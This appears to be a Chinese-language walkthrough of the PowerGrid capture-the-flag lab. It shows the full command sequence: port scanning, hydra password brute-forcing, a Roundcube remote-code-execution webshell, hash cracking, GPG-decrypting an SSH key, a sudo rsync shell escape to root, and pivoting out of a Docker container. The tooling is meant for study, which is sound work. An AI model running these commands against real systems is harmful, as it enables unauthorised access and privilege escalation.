

## 端口扫描

```bash
┌──(fforu㉿fforu)-[~/workspace]
└─$ sudo nmap -sT --min-rate 9999 -p- 192.168.1.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 16:34 CST
Nmap scan report for 192.168.1.104
Host is up (0.017s latency).
Not shown: 51048 filtered tcp ports (no-response), 14363 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
143/tcp   open  imap
993/tcp   open  imaps
MAC Address: 08:00:27:DB:DB:5F (Oracle VirtualBox virtual NIC)

一开始不知道为什么扫出了很多端口
但是详细扫描的时候只剩了这三个

┌──(fforu㉿fforu)-[~/workspace]
└─$ sudo nmap -sT -sCV -O -p 80,143,363,364,993,1370,2029,2802,4736,4833,5735,6294,8487,9259,9341,9392,9929,10382,11636,12632,13081,13083,13230,14765,14955,16554,17554,18100,18298,18419,19329,20964,21176,21285,21482,21894,21966,22237,23061,23899,25876,26726,27012,27514,27730,27951,28332,29202,29500,30476,30979,32013,32205,32432,32824,33891,35055,35602,36057,36076,36576,37180,37374,37800,37994,38360,39178,39216,40001,40688,40857,40864,41275,41561,41755,41864,42082,42737,44440,44548,45200,45322,45861,46250,46445,46575,48195,48573,48666,49457,49504,49618,49649,50282,51031,51885,52239,52917,53592,54316,54333,55864,55991,56633,57528,57684,57846,58900,59194,60756,61027,61053,62109,62152,62374,62754,62910,63025,63287,63894,64070,64175,64396,65186 192.168.1.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 16:44 CST
Nmap scan report for 192.168.1.104
Host is up (0.0017s latency).
Not shown: 121 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: PowerGrid - Turning your lights off unless you pay.
143/tcp open  imap     Dovecot imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: ENABLE IDLE listed have ID more IMAP4rev1 LOGINDISABLEDA0001 SASL-IR STARTTLS LITERAL+ post-login Pre-login OK capabilities LOGIN-REFERRALS
| ssl-cert: Subject: commonName=powergrid
| Subject Alternative Name: DNS:powergrid
| Not valid before: 2020-05-19T16:49:55
|_Not valid after:  2030-05-17T16:49:55
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: ENABLE IDLE listed have ID AUTH=PLAINA0001 more SASL-IR LOGIN-REFERRALS LITERAL+ post-login Pre-login OK capabilities IMAP4rev1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=powergrid
| Subject Alternative Name: DNS:powergrid
| Not valid before: 2020-05-19T16:49:55
|_Not valid after:  2030-05-17T16:49:55
MAC Address: 08:00:27:DB:DB:5F (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/19%OT=80%CT=363%CU=38464%PV=Y%DS=1%DC=D%G=Y%M=080
OS:027%TM=65F9508B%P=x86_64-pc-linux-gnu)SEQ(II=I)ECN(R=N)T1(R=N)T2(R=N)T3(
OS:R=N)T4(R=N)T5(R=N)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.96 seconds
```

## 目录爆破

```bash
┌──(fforu㉿fforu)-[~/workspace]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.104/ -q
/images               (Status: 301) [Size: 315] [--> http://192.168.1.104/images/]
/zmail                (Status: 401) [Size: 460]
```

就得到了这两个目录

## web渗透

![index](images/2024-03-19-18-44-43.png)

![zmail](images/2024-03-19-18-43-11.png)
需要登录

hydra表单爆破

hydra -L users -P /usr/share/wordlists/rockyou.txt  192.168.1.104  http-get /zmail  -t 50

用户名用首页的三个hacker的名字
deez1, p48 and all2 

```bash
┌──(fforu㉿fforu)-[~/workspace]
└─$ hydra -L users -P /usr/share/wordlists/rockyou.txt  192.168.1.104  http-get /zmail  -t 50
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-19 18:42:02
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 50 tasks per 1 server, overall 50 tasks, 28688798 login tries (l:2/p:14344399), ~573776 tries per task
[DATA] attacking http-get://192.168.1.104:80/zmail
[STATUS] 24815.00 tries/min, 24815 tries in 00:01h, 28663983 to do in 19:16h, 50 active
[STATUS] 24972.33 tries/min, 74917 tries in 00:03h, 28613881 to do in 19:06h, 50 active
[80][http-get] host: 192.168.1.104   login: p48   password: electrico
```

得到密码
登陆进去
![](images/2024-03-19-18-48-09.png)
是个邮箱系统

邮箱内有一封important邮件
![](images/2024-03-19-20-13-33.png)
也就是说内网中还有一个服务器
并且能够控制这台服务器

```bash
┌──(fforu㉿fforu)-[~/workspace]
└─$ searchsploit RoundCube
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Roundcube 1.2.2 - Remote Code Execution                                                                                   | php/webapps/40892.txt
Roundcube rcfilters plugin 2.1.6 - Cross-Site Scripting                                                                   | linux/webapps/45437.txt
Roundcube Webmail - Multiple Vulnerabilities                                                                              | php/webapps/11036.txt
Roundcube Webmail 0.1 - 'index.php' Cross-Site Scripting                                                                  | php/webapps/28988.txt
Roundcube Webmail 0.1 - CSS Expression Input Validation                                                                   | php/webapps/30877.txt
Roundcube Webmail 0.2 - Cross-Site Scripting                                                                              | php/webapps/33473.txt
Roundcube Webmail 0.2-3 Beta - Code Execution                                                                             | php/webapps/7549.txt
Roundcube Webmail 0.2b - Remote Code Execution                                                                            | php/webapps/7553.sh
Roundcube Webmail 0.3.1 - Cross-Site Request Forgery / SQL Injection                                                      | php/webapps/17957.txt
Roundcube Webmail 0.8.0 - Persistent Cross-Site Scripting                                                                 | php/webapps/20549.py
Roundcube Webmail 1.1.3 - Directory Traversal                                                                             | php/webapps/39245.txt
Roundcube Webmail 1.2 - File Disclosure                                                                                   | php/webapps/49510.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
有个远程代码执行

![](images/2024-03-19-19-14-06.png)
![](images/2024-03-19-19-22-48.png)
改两处地方
subject写入webshell
form写文件地址
按要求在subject写入恶意代码
burp抓包改包
![](images/2024-03-19-19-20-38.png)
在form加上要写入的文件位置
![](images/2024-03-19-19-17-19.png)

连上webshell反弹shell

## 反弹shell
![](images/2024-03-19-19-26-06.png)
得到shell

![](images/2024-03-19-19-31-13.png)
得到flag1，但是不知道旋转是什么意思
通目录下还有一个密码文件
p48:$apr1$TychQAEQ$keuGxoPcPeMHc9thzQV7D1

```bash
┌──(fforu㉿fforu)-[~/workspace]
└─$ hashcat -a 0  -m 1600 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 5600H with Radeon Graphics, 6615/13295 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 3 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$apr1$TychQAEQ$keuGxoPcPeMHc9thzQV7D1:electrico

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$TychQAEQ$keuGxoPcPeMHc9thzQV7D1
Time.Started.....: Tue Mar 19 19:45:21 2024 (4 secs)
Time.Estimated...: Tue Mar 19 19:45:25 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    35825 H/s (8.47ms) @ Accel:512 Loops:62 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 116736/14344385 (0.81%)
Rejected.........: 0/116736 (0.00%)
Restore.Point....: 110592/14344385 (0.77%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1000
Candidate.Engine.: Device Generator
Candidates.#1....: munster1 -> lucyann

Started: Tue Mar 19 19:44:50 2024
Stopped: Tue Mar 19 19:45:26 2024
```
就是刚刚那个密码啊这

那su到p48用户试试
可以切换，那么就上传fscan看一下内网信息
![](images/2024-03-19-20-16-26.png)
那就是172.17.0.2主机
## 内网移动
看一下家目录有没有解密gpg密钥的文件
在家目录找到私钥privkey.gpg
找到后传到kali里导入解密一下


```bash
┌──(fforu㉿fforu)-[~/workspace]
└─$ sudo gpg --import privkey.gpg
[sudo] password for fforu:
gpg: directory '/root/.gnupg' created
gpg: keybox '/root/.gnupg/pubring.kbx' created
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 73D19820E29199BD: public key "P48 Hacker <p48@powergrid>" imported
gpg: key 73D19820E29199BD: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(fforu㉿fforu)-[~/workspace]
└─$ gpg --list-secret-keys

┌──(fforu㉿fforu)-[~/workspace]
└─$ sudo gpg --list-secret-keys
/root/.gnupg/pubring.kbx
------------------------
sec   rsa4096 2020-05-19 [SC]
      76234C43E84EFC92904CAC8C73D19820E29199BD
uid           [ unknown] P48 Hacker <p48@powergrid>
ssb   rsa4096 2020-05-19 [E]


┌──(fforu㉿fforu)-[~/workspace]
└─$ sudo gpg -d p48
gpg: encrypted with 4096-bit RSA key, ID 559041BFED54D3A2, created 2020-05-19
      "P48 Hacker <p48@powergrid>"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAsBNVFExFUwpIaHIhMQDlu8mFwkNZWRFWBS5qE3BUUhk39/3CeAv2
81W7Z/63EM78eE1PjiccpNA5Vi2r+nfYLS6Nj7qy11BQsGlUKgmcxW79DdmC78LaFHUkYh
G3KtnJcLh4GAlPXoOwwXgwT8iu6dbxXGOzONCrWTTQ7/UjgJOcVIx9814uBDbZAYlXyjvN
aMnrO16Jff00wurmqNfq8D0lLWiU9Wq+9j5z+XvqHGaei3s3Wdhfoc3jtPfwUFsKSlVrQM
....
....
-----END OPENSSH PRIVATE KEY-----
gpg: Signature made Wed 20 May 2020 03:17:30 AM CST
gpg:                using RSA key 76234C43E84EFC92904CAC8C73D19820E29199BD
gpg: Good signature from "P48 Hacker <p48@powergrid>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: 7623 4C43 E84E FC92 904C  AC8C 73D1 9820 E291 99BD
```

得到ssh私钥
本来想着连root，结果最后才发现连的是p48用户

```bash
p48@ef117d7a978f:~$ sudo -l
sudo -l
Matching Defaults entries for p48 on ef117d7a978f:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User p48 may run the following commands on ef117d7a978f:
    (root) NOPASSWD: /usr/bin/rsync
p48@ef117d7a978f:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# whoami
whoami
root
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

此时已经得到这台服务器的root权限了

## 提权
ssh连回去就可以了
```bash
#  ssh root@172.17.0.1
 ssh root@172.17.0.1
Linux powergrid 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 26 18:15:49 2020
root@powergrid:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:d0:18:d7 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.104/24 brd 192.168.1.255 scope global dynamic eth0
       valid_lft 4283sec preferred_lft 4283sec
    inet6 fe80::a00:27ff:fed0:18d7/64 scope link
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:8b:e7:ec:f4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:8bff:fee7:ecf4/64 scope link
       valid_lft forever preferred_lft forever
5: vethd59dde6@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
    link/ether 66:2e:42:e5:5c:79 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::642e:42ff:fee5:5c79/64 scope link
       valid_lft forever preferred_lft forever
root@powergrid:~# ls /root
ls /root
 chown.sh   flag4.txt   malware.php  'ystemctl status docker'
root@powergrid:~# cat /root/flag4.txt
cat /root/flag4.txt
f5afaf46ede1dd5de76eac1876c60130

Congratulations. This is the fourth and final flag. Make sure to delete /var/www/html/startTime.txt to stop the attack (you will need to run chattr -i /var/www/html/startTime.txt first).

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by Thomas Williams - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear your comments.
```